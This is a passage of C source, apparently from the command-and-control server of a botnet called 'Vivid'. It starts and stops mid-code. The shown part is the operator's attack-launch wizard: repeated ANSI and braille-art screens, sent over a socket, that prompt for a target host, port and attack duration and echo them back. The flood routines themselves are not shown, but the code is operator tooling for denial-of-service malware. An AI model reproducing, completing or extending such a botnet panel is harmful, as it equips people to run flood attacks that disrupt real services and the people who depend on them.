                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 5){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⡐⢨⣭⡋⢛⢛⢛⡛⠙⠿⢛⠛⠻⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡧⡁⠀⣭⣤⣾⡟⠀⣸⢟⣩⡔⠀⢼⡟⣷⠀⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⢫⣴⠁⣿⠀⠹⢫⡭⠁⡐⣏⠺⡛⠀⣴⣶⣶⡟⢀⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⢸⢁⣑⡛⠀⠀⣿⡇⣰⣟⣿⢡⠀⠀⣛⡛⠛⠠⢾⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣯⣥⣭⣉⣥⣶⣵⣮⣥⣿⣿⣿⣷⣄⣭⣭⣴⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 6){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⡟⠘⣿⠟⣉⡴⡋⢨⢻⡿⠃⣽⣿⡿⢟⡫⢀⢸⣿⣿⠋⢰⣦⣶⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣟⣵⢆⠐⣭⠩⡚⠁⣼⣈⠅⢀⡽⠑⠛⢁⠴⠩⡚⣭⠅⡇⠘⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡿⣣⣿⡇⢟⣖⠇⣶⣙⣿⠰⣻⠲⢃⣦⣿⣇⠟⣱⣃⠾⢃⣠⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 7){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⠿⣿⣿⣿⣿⢟⡍⣿⣿⣿⡿⠿⠿⢿⣿⣿⡿⠿⣿⠿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣼⡈⢻⣿⡇⠏⢠⣿⡿⡁⠀⣿⣧⣬⡟⢁⣤⣛⣛⣥⣾⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣟⣾⡇⢸⡟⠁⡠⢛⣛⢣⡇⠀⣿⣿⠿⠂⢈⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡇⠘⢠⣾⢰⡿⠯⣣⣿⠀⢸⠁⣠⣾⠿⠿⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣧⡀⣿⣿⡮⡣⠾⠶⠂⣠⡎⠀⢭⣶⠿⣋⣼⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 8){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠿⠛⣩⣵⢌⣿⣿⠃⢙⢿⣿⣿⠸⠿⠿⠛⣩⣶⢌⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡾⠋⣠⣬⣭⣷⡿⣫⡶⠁⣸⢸⡿⠃⡸⠋⣠⣬⣭⣶⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⠁⣰⣿⡿⠟⠋⠾⡙⠁⣰⣿⢸⠁⡐⠀⣼⣿⠿⠛⢻⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⠀⢟⣵⡾⢋⣆⢾⡆⣰⣹⣿⠀⣸⣇⠀⢋⣵⡿⣫⣾⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣟⣛⣤⣤⣥⣾⣿⣿⣦⣅⣿⣿⣿⣦⣟⣫⣤⣤⣵⣾⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            sprintf(mysecs, "%s", buf);
            Trim(mysecs);
            memset(buf, 0, sizeof(buf));
            if(atk_wtng == 1){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⣿⣿⡿⢿⣿⣿⣿⡿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠿⣿⠿⠿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⠃⢸⣿⣿⡇⠈⣿⠿⣛⠅⢈⣴⣶⡄⠙⣿⣿⡿⣋⠀⣱⣶⡆⢹"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣧⣨⠅⠀⣼⠿⡟⠀⠄⣵⣾⠏⠀⣜⣛⣽⡇⢀⢛⡵⢪⠁⢀⡬⠟⢀⣾"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡏⢀⣼⣯⠊⠀⢈⣶⡬⡊⠀⣾⣿⣿⡟⢁⣆⠛⣩⠀⢠⣭⣵⣶⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⡇⢼⡿⢫⠀⣼⣿⣿⡜⠀⣦⡵⠖⣂⣤⣿⣽⡹⢿⢠⣷⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣶⣾⣿⣷⣶⣿⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 2){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⠛⢛⣿⠿⢿⣿⣿⣿⢿⡿⢿⣿⣿⡿⣿⠿⢿⣿⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⣛⣛⣣⣾⡟⢀⣢⡤⢀⣴⣞⣣⠿⣫⠀⣵⣷⠈⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡿⣫⡍⢀⢺⠋⣰⣿⡿⠟⡵⠏⠂⠰⣝⣡⣾⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣇⢿⢀⣾⣿⠀⢫⡷⢟⣥⢶⡇⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣷⣾⣿⣽⣶⣶⣾⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 3){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⢉⣭⢉⡌⢹⣿⣿⠙⣿⣿⡿⠉⢻⣿⣿⠙⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠏⡆⠈⣿⠏⢠⣾⣿⠏⢠⢟⣭⠎⢀⠎⣿⠃⢰⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡏⡴⠿⢄⣷⠀⠋⢰⡿⠟⠁⡠⡇⠣⠁⠀⣾⢸⠃⣰⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⡷⢜⠰⠷⠂⣠⡕⣢⡌⢀⣶⣾⣧⡻⢠⣧⣿⣎⢰⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 4){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠿⡛⠁⡌⣟⣛⠛⠩⠶⣢⡿⢟⠈⡿⠋⣴⣶⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡟⠕⠾⠋⣠⡺⡱⡞⢁⣾⣿⣿⠩⠊⠃⠘⣡⣾⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⢟⣡⠀⡠⡶⢮⢡⡺⠀⠞⣫⡶⣠⢡⠂⣤⣷⡈⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣦⣛⣼⣿⣿⣿⣬⣘⣥⣬⣵⣾⣿⣮⣤⣿⣿⣷⡘⢿⡟⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mVivid\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 5){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⡐⢨⣭⡋⢛⢛⢛⡛⠙⠿⢛⠛⠻⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡧⡁⠀⣭⣤⣾⡟⠀⣸⢟⣩⡔⠀⢼⡟⣷⠀⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⢫⣴⠁⣿⠀⠹⢫⡭⠁⡐⣏⠺⡛⠀⣴⣶⣶⡟⢀⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⢸⢁⣑⡛⠀⠀⣿⡇⣰⣟⣿⢡⠀⠀⣛⡛⠛⠠⢾⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣯⣥⣭⣉⣥⣶⣵⣮⣥⣿⣿⣿⣷⣄⣭⣭⣴⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   